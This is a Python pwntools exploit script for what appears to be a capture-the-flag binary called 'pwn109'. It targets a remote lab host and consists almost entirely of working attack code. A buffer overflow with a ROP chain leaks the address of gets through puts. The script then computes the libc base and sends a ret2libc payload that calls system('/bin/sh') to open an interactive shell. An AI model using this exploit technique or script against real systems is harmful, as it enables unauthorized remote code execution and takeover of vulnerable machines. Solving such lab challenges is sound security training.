from pwn import *

elf = ELF("./pwn109.pwn109",checksec=False)

rop = ROP(elf)

#p = elf.process()
p = remote('10.10.91.57',9009)

pop_rdi_ret = rop.find_gadget(["pop rdi", "ret"])[0]
ret = rop.find_gadget(["ret"])[0]

puts_plt = elf.plt['puts'] 
puts_got = elf.got['puts']
gets_got = elf.got['gets']
main_plt = elf.symbols['main']
pop_rdi = p64(0x4012a3)

log.info("Main start: " + hex(main_plt))
log.info("Puts plt: " + hex(puts_plt))
log.info("Puts GOT: " + hex(puts_got))

p.info("============================")

payload = b'A'*40
payload += pop_rdi
payload += p64(gets_got)
payload += p64(puts_plt)
payload += p64(main_plt)

p.readuntil(b'ahead')
p.readline()
p.sendline(payload)

#if you just type this, you'll receive P + leakadress + main banner again
#r = p.recv()

#b'' is not part of recv
r = p.recv(6)+b'\x00\x00'
leak_gets=u64(r)

log.info(f"Leaked gets : {hex(leak_gets)}")

libc = ELF("libc6_2.27-3ubuntu1.4_amd64.so")
libc.address = leak_gets - libc.symbols['gets']

log.info(f"Base address : {hex(libc.address)}")

bin_sh = next(libc.search(b"/bin/sh")) 
system = libc.symbols['system']

log.info(f"/bin/sh address: {hex(bin_sh)}")
log.info(f"System address: {hex(system)}")

#payload = buffer + pop_rdi + bin/sh + system
payload2 = b'A'*40
payload2 += p64(ret)
payload2 += p64(pop_rdi_ret)
payload2 += p64(bin_sh)
payload2 += p64(system)

#with open("payload","wb") as h:
#	h.write(payload2)

p.sendlineafter(b"Go ahead \xf0\x9f\x98\x8f\n", payload2)
p.interactive()



